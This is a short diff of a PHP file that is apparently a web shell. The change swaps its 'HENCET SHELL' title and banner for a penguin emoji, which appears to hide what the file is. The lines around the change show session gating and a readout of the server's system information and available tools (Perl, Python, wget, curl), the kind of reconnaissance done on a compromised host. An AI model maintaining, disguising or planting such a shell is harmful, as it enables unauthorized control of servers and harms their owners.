@@ -87,7 +87,7 @@ if (!isset($_SESSION[md5($_SERVER["HTTP_HOST"])])) {
 ?>
 <html>
 <head>
-<title>HENCET SHELL</title>
+<title>🐧</title>
 <meta name='author' content='Shun403'>
 <meta charset="UTF-8">
 <style type='text/css'>
@@ -393,7 +393,7 @@ if (!function_exists("posix_getegid")) {
     $gid = $gid["gid"];
 }
 echo "<BR>";
-echo "<center><font size='20px' color='red'>HENCET SHELL</font>";
+echo "<center><font size='20px' color='red'>🐧</font>";
 echo "<br>";
 echo "System: " . php_uname() . "<br>";
 echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
